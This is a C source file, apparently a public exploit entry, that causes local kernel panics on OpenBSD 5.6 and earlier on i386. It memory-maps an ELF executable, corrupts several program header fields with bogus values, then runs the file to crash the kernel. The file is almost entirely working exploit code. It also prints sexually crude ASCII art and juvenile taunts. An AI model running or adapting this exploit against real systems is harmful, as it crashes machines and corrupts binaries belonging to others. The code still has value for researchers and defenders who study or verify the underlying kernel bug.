/*

# Exploit Title: OpenBSD <= 5.6 - Multiple Local Kernel Panics
# Exploit Author: nitr0us
# Vendor Homepage: http://www.openbsd.org
# Version: 5.6
# Tested on: OpenBSD 5.6 i386 (snapshot - Nov 25th, 2014), OpenBSD 5.6 i386, OpenBSD 5.5 i386

 * - 0xb16b00b5.c
 *
 * - Alejandro Hernandez (@nitr0usmx)
 * - Mexico 2015
 *
 * #########################################################################
 * #         OpenBSD <= 5.6 kernel panic()'s in sys/uvm/uvm_map.c          #
 * #########################################################################
 *
 * Tested under:
 * - OpenBSD 5.6 i386 (snapshot - Nov 25th, 2014)
 * - OpenBSD 5.6 i386
 * - OpenBSD 5.5 i386
 *
 * https://www.youtube.com/watch?feature=player_detailpage&v=PReopSQZOrY#t=20
 *
 */

#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/param.h>
#include <sys/types.h>

#ifndef  __OpenBSD__
	#error "Not OpenBSD !!!1111";
#else
#include <sys/exec_elf.h>
#endif

#ifndef __i386__
	#error "Not i386 !!!1111";
#endif

char big_b00bz[] =
"       8M:::::::8888M:::::888:::::::88:::8888888::::::::Mm\n"
"      88MM:::::8888M:::::::88::::::::8:::::888888:::M:::::M\n"
"     8888M:::::888MM::::::::8:::::::::::M::::8888::::M::::M\n"
"    88888M:::::88:M::::::::::8:::::::::::M:::8888::::::M::M\n"
"   88 888MM:::888:M:::::::::::::::::::::::M:8888:::::::::M:\n"
"   8 88888M:::88::M:::::::::::::::::::::::MM:88::::::::::::M\n"
"     88888M:::88::M::::::::::*88*::::::::::M:88::::::::::::::M\n"
"    888888M:::88::M:::::::::88@@88:::::::::M::88::::::::::::::M\n"
"    888888MM::88::MM::::::::88@@88:::::::::M:::8::::::::::::::*8\n"
"    88888  M:::8::MM:::::::::*88*::::::::::M:::::::::::::::::88@@\n"
"    8888   MM::::::MM:::::::::::::::::::::MM:::::::::::::::::88@@\n"
"     888    M:::::::MM:::::::::::::::::::MM::M::::::::::::::::*8\n"
"     888    MM:::::::MMM::::::::::::::::MM:::MM:::::::::::::::M\n"
"      88     M::::::::MMMM:::::::::::MMMM:::::MM::::::::::::MM\n"
"       88    MM:::::::::MMMMMMMMMMMMMMM::::::::MMM::::::::MMM\n"
"        88    MM::::::::::::MMMMMMM::::::::::::::MMMMMMMMMM\n"
"         88   8MM::::::::::::::::::::::::::::::::::MMMMMM\n"
"          8   88MM::::::::::::::::::::::M:::M::::::::MM\n"
"              888MM::::::::::::::::::MM::::::MM::::::M";

int main(int argc, char **argv)
{
	Elf32_Ehdr *hdr;
	Elf32_Phdr *pht; 
	struct stat statinfo;
	char *elfptr;
	int fd;

	if(argc != 2) return printf("Usage: %s <elf_exec>\n", argv[0]);
	fd = open(argv[1], O_RDWR);
	fstat(fd, &statinfo);
	elfptr = (char *) mmap(NULL, statinfo.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	hdr = (Elf32_Ehdr *) (elfptr);
	pht = (Elf32_Phdr *) (elfptr + hdr->e_phoff);
	printf("%s", big_b00bz);
	pht[9].p_type   = 0x7defaced; // <--- these overwrites ------------v
	pht[2].p_filesz = (arc4random() % 2) ? 0x41414141 : 0x43434343; // are necessary
	sleep(3 + (arc4random() % 3));
	if(arc4random() % 3 == 2) puts(" .. I like b1g 0nez !!"); // 33.33% chance
	else { if(arc4random() % 2){ puts(" .. want s0me ?!"); pht[5].p_vaddr = 0xb16b00b5; } // .6666 * .5 = 33.33% chance
	else { puts(" .. j00 like it ?!"); pht[5].p_vaddr = 0x0ace55e8; }} // .6666 * .5 = 33.33% chance
	msync(elfptr, 0, MS_ASYNC);
	munmap(elfptr, statinfo.st_size);
	close(fd);
	sleep(3 + (arc4random() % 3));
	system(argv[1]); // ( o )( o )   panic()
	puts("... s0rry, this piece of sh1t didn't w0rk in j00r obsd\n");
	return 0xDEFECA7E;
}